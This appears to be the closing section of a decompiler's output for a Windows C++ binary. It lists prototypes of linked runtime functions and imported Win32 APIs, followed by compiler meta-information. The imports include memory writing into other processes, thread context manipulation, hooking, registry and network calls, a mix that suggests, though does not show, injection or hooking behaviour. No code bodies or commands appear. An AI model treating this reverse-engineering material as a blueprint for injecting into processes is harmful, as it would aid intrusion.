// int32_t __chkstk(void);
// int32_t __CxxThrowException_40_8(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4);
// int32_t __FindAndUnlinkFrame(int32_t a1);
// int32_t __getptd(void);
// int32_t __IsExceptionObjectToBeDestroyed(int32_t a1);
// int32_t __local_unwind4(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
// int32_t __lock(int32_t a1);
// int32_t __mtterm(void);
// int32_t __recalloc(int32_t a1, int32_t a2, int32_t a3);
// int32_t __SEH_epilog4(void);
// int snprintf(char * restrict s, size_t maxlen, const char * restrict format, ...);
// char * strdup(const char * s);
// int __cdecl stricmp(_In_z_ char const * String1, _In_z_ char const * String2);
// char * __cdecl strlwr(_Inout_z_ char * String);
// int32_t __strlwr_s(int32_t a1, int32_t a2, int32_t a3);
// int32_t __time64(void);
// int32_t __ultoa_s(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
// int32_t __unlock(int32_t a1);
// int32_t __unlock_fhandle(int32_t a1);
// int32_t __unlock_file(int32_t a1);
// int32_t __unlock_file2(int32_t a1, int32_t a2);
// int32_t __wassert(void);
// wchar_t * wcsdup(const wchar_t * s);
// wchar_t * __cdecl wcslwr(_Inout_z_ wchar_t * String);
// int __cdecl wcsnicmp(wchar_t const * String1, wchar_t const * String2, _In_ size_t MaxCount);
// long int wcstol_l(const wchar_t * restrict nptr, wchar_t ** restrict endptr, int base, __locale_t loc);
// int atexit(void(* func)(void));
// int32_t _doexit(int32_t a1, int32_t a2, int32_t a3);
// int fflush(FILE * stream);
// int32_t _flsall(int32_t a1);
// void free(void * ptr);
// int isdigit(int c);
// void * malloc(size_t size);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// int32_t _memcpy2(int32_t a1, int32_t a2, int32_t a3);
// errno_t memcpy_s(void * const Destination, _In_ rsize_t const DestinationSize, void const * const Source, _In_ rsize_t const SourceSize);
// void * memset(void * s, int c, size_t n);
// int printf(const char * restrict format, ...);
// int rand(void);
// int sprintf(char * restrict s, const char * restrict format, ...);
// int sprintf_s(char * const Buffer, _In_ size_t const BufferCount, _In_z_ char const * const Format, ...);
// char * strchr(char * s, int c);
// int strncmp(const char * s1, const char * s2, size_t n);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);
// int swprintf_s(wchar_t * const Buffer, _In_ size_t const BufferCount, _In_z_ wchar_t const * const Format, ...);
// int vsprintf_s(char * const Buffer, _In_ size_t const BufferCount, _In_z_ char const * const Format, va_list ArgList);
// errno_t __cdecl wcscat_s(wchar_t * Destination, _In_ rsize_t SizeInWords, _In_z_ wchar_t const * Source);
// errno_t __cdecl wcscpy_s(wchar_t * Destination, _In_ rsize_t SizeInWords, _In_z_ wchar_t const * Source);
// errno_t __cdecl wcsncpy_s(wchar_t * Destination, _In_ rsize_t SizeInWords, wchar_t const * Source, _In_ rsize_t MaxCount);
// wchar_t * wcsstr(wchar_t * haystack, const wchar_t * needle);

// --------------- Dynamically Linked Functions ---------------

// LRESULT CallNextHookEx(_In_opt_ HHOOK hhk, _In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
// LPWSTR CharNextW(_In_ LPCWSTR lpsz);
// BOOL CloseHandle(_In_ HANDLE hObject);
// HRESULT CoCreateInstance(_In_ REFCLSID rclsid, _In_opt_ LPUNKNOWN pUnkOuter, _In_ DWORD dwClsContext, _In_ REFIID riid, LPVOID * ppv);
// HRESULT CoInitialize(_In_opt_ LPVOID pvReserved);
// BOOL CopyFileW(_In_ LPCWSTR lpExistingFileName, _In_ LPCWSTR lpNewFileName, _In_ BOOL bFailIfExists);
// LPVOID CoTaskMemAlloc(_In_ SIZE_T cb);
// void CoTaskMemFree(LPVOID pv);
// LPVOID CoTaskMemRealloc(LPVOID pv, _In_ SIZE_T cb);
// BOOL CreateDirectoryW(_In_ LPCWSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// HANDLE CreateMutexW(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCWSTR lpName);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// PVOID DecodePointer(_In_opt_ PVOID Ptr);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL DeleteFileW(_In_ LPCWSTR lpFileName);
// LRESULT DispatchMessageW(_In_ const MSG * lpMsg);
// VOID DnsFree(PVOID pData, _In_ DNS_FREE_TYPE FreeType);
// DNS_STATUS DnsQuery_A(_In_ PCSTR pszName, _In_ WORD wType, _In_ DWORD Options, _Inout_opt_ PVOID pExtra, PDNS_RECORD * ppQueryResults, PVOID * pReserved);
// PVOID EncodePointer(_In_opt_ PVOID Ptr);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// HRSRC FindResourceW(_In_opt_ HMODULE hModule, _In_ LPCWSTR lpName, _In_ LPCWSTR lpType);
// HWND FindWindowA(_In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName);
// BOOL FlushInstructionCache(_In_ HANDLE hProcess, LPCVOID lpBaseAddress, _In_ SIZE_T dwSize);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// ULONG GetAdaptersInfo(PIP_ADAPTER_INFO AdapterInfo, _Inout_ PULONG SizePointer);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentProcessId(VOID);
// HANDLE GetCurrentThread(VOID);
// DWORD GetCurrentThreadId(VOID);
// DWORD GetLastError(VOID);
// BOOL GetMessageW(_Out_ LPMSG lpMsg, _In_opt_ HWND hWnd, _In_ UINT wMsgFilterMin, _In_ UINT wMsgFilterMax);
// DWORD GetModuleFileNameW(_In_opt_ HMODULE hModule, LPWSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// UINT GetPrivateProfileIntW(_In_ LPCWSTR lpAppName, _In_ LPCWSTR lpKeyName, _In_ INT nDefault, _In_opt_ LPCWSTR lpFileName);
// DWORD GetPrivateProfileStringW(_In_opt_ LPCWSTR lpAppName, _In_opt_ LPCWSTR lpKeyName, _In_opt_ LPCWSTR lpDefault, LPWSTR lpReturnedString, _In_ DWORD nSize, _In_opt_ LPCWSTR lpFileName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetSystemInfo(_Out_ LPSYSTEM_INFO lpSystemInfo);
// DWORD GetTempPathW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// BOOL GetThreadContext(_In_ HANDLE hThread, _Inout_ LPCONTEXT lpContext);
// LCID GetThreadLocale(void);
// int GetThreadPriority(_In_ HANDLE hThread);
// BOOL HttpQueryInfoA(_In_ HINTERNET hRequest, _In_ DWORD dwInfoLevel, LPVOID lpBuffer, _Inout_ LPDWORD lpdwBufferLength, _Inout_opt_ LPDWORD lpdwIndex);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL InitializeCriticalSectionAndSpinCount(_Out_ LPCRITICAL_SECTION lpCriticalSection, _In_ DWORD dwSpinCount);
// unsigned InterlockedDecrement(_Inout_ unsigned volatile * Addend);
// unsigned InterlockedIncrement(_Inout_ unsigned volatile * Addend);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetOpenA(_In_ LPCSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCSTR lpszProxyName, _In_ LPCSTR lpszProxyBypass, _In_ DWORD dwFlags);
// HINTERNET InternetOpenUrlA(_In_ HINTERNET hInternet, _In_ LPCSTR lpszUrl, _In_ LPCSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenUrlW(_In_ HINTERNET hInternet, _In_ LPCWSTR lpszUrl, _In_ LPCWSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenW(_In_ LPCWSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCWSTR lpszProxyName, _In_ LPCWSTR lpszProxyBypass, _In_ DWORD dwFlags);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HMODULE LoadLibraryExW(_In_ LPCWSTR lpLibFileName, HANDLE hFile, _In_ DWORD dwFlags);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HRESULT LoadRegTypeLib(REFGUID rguid, WORD wVerMajor, WORD wVerMinor, LCID lcid, ITypeLib ** pptlib);
// HGLOBAL LoadResource(_In_opt_ HMODULE hModule, _In_ HRSRC hResInfo);
// HRESULT LoadTypeLib(_In_z_ LPCOLESTR szFile, ITypeLib ** pptlib);
// int lstrcmpiW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrlenW(_In_ LPCWSTR lpString);
// int MultiByteToWideChar(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCCH lpMultiByteStr, _In_ int cbMultiByte, LPWSTR lpWideCharStr, _In_ int cchWideChar);
// HANDLE OpenThread(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwThreadId);
// BOOL PathFileExistsW(_In_ LPCWSTR pszPath);
// LPCWSTR PathFindFileNameW(_In_ LPCWSTR pszPath);
// void PathRemoveExtensionW(_Inout_ LPWSTR pszPath);
// BOOL PathRemoveFileSpecW(_Inout_ LPWSTR lpszPath);
// BOOL Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// VOID RaiseException(_In_ DWORD dwExceptionCode, _In_ DWORD dwExceptionFlags, _In_ DWORD nNumberOfArguments, const ULONG_PTR * lpArguments);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// LSTATUS RegCreateKeyExW(_In_ HKEY hKey, _In_ LPCWSTR lpSubKey, DWORD Reserved, _In_opt_ LPWSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteKeyW(_In_ HKEY hKey, _In_ LPCWSTR lpSubKey);
// LSTATUS RegDeleteValueW(_In_ HKEY hKey, _In_opt_ LPCWSTR lpValueName);
// LSTATUS RegEnumKeyExW(_In_ HKEY hKey, _In_ DWORD dwIndex, LPWSTR lpName, _Inout_ LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, _Inout_opt_ LPDWORD lpcchClass, _Out_opt_ PFILETIME lpftLastWriteTime);
// LSTATUS RegOpenKeyExW(_In_ HKEY hKey, _In_opt_ LPCWSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// LSTATUS RegQueryInfoKeyW(_In_ HKEY hKey, LPWSTR lpClass, _Inout_opt_ LPDWORD lpcchClass, LPDWORD lpReserved, _Out_opt_ LPDWORD lpcSubKeys, _Out_opt_ LPDWORD lpcbMaxSubKeyLen, _Out_opt_ LPDWORD lpcbMaxClassLen, _Out_opt_ LPDWORD lpcValues, _Out_opt_ LPDWORD lpcbMaxValueNameLen, _Out_opt_ LPDWORD lpcbMaxValueLen, _Out_opt_ LPDWORD lpcbSecurityDescriptor, _Out_opt_ PFILETIME lpftLastWriteTime);
// LSTATUS RegSetValueExW(_In_ HKEY hKey, _In_opt_ LPCWSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// BOOL RemoveDirectoryW(_In_ LPCWSTR lpPathName);
// DWORD ResumeThread(_In_ HANDLE hThread);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// BOOL SetThreadLocale(_In_ LCID Locale);
// BOOL SetThreadPriority(_In_ HANDLE hThread, _In_ int nPriority);
// HHOOK SetWindowsHookExW(_In_ int idHook, _In_ HOOKPROC lpfn, _In_opt_ HINSTANCE hmod, _In_ DWORD dwThreadId);
// HINSTANCE ShellExecuteW(_In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpOperation, _In_ LPCWSTR lpFile, _In_opt_ LPCWSTR lpParameters, _In_opt_ LPCWSTR lpDirectory, _In_ INT nShowCmd);
// HRESULT SHGetMalloc(IMalloc ** ppMalloc);
// BOOL SHGetPathFromIDListW(_In_ PCIDLIST_ABSOLUTE pidl, LPWSTR pszPath);
// HRESULT SHGetSpecialFolderLocation(HWND hwnd, _In_ int csidl, PIDLIST_ABSOLUTE * ppidl);
// DWORD SizeofResource(_In_opt_ HMODULE hModule, _In_ HRSRC hResInfo);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// int StringFromGUID2(_In_ REFGUID rguid, LPOLESTR lpsz, _In_ int cchMax);
// DWORD SuspendThread(_In_ HANDLE hThread);
// BSTR SysAllocString(const OLECHAR * psz);
// void SysFreeString(_In_opt_ BSTR bstrString);
// UINT SysStringLen(_In_opt_ BSTR pbstr);
// BOOL TerminateThread(_In_ HANDLE hThread, _In_ DWORD dwExitCode);
// DWORD TlsAlloc(VOID);
// BOOL TranslateMessage(_In_ const MSG * lpMsg);
// HRESULT UrlUnescapeA(_Inout_ PSTR pszUrl, PSTR pszUnescaped, _Inout_opt_ DWORD * pcchUnescaped, DWORD dwFlags);
// HRESULT VarUI4FromStr(_In_ LPCOLESTR strIn, _In_ LCID lcid, _In_ ULONG dwFlags, _Out_ ULONG * pulOut);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// BOOL VirtualProtectEx(_In_ HANDLE hProcess, _In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);
// SIZE_T VirtualQuery(_In_opt_ LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, _In_ SIZE_T dwLength);
// int WideCharToMultiByte(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCWCH lpWideCharStr, _In_ int cchWideChar, LPSTR lpMultiByteStr, _In_ int cbMultiByte, _In_opt_ LPCCH lpDefaultChar, _Out_opt_ LPBOOL lpUsedDefaultChar);
// BOOL WritePrivateProfileStringW(_In_opt_ LPCWSTR lpAppName, _In_opt_ LPCWSTR lpKeyName, _In_opt_ LPCWSTR lpString, _In_opt_ LPCWSTR lpFileName);
// BOOL WriteProcessMemory(_In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T * lpNumberOfBytesWritten);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (10.0)
// Detected language: C++
// Detected functions: 350
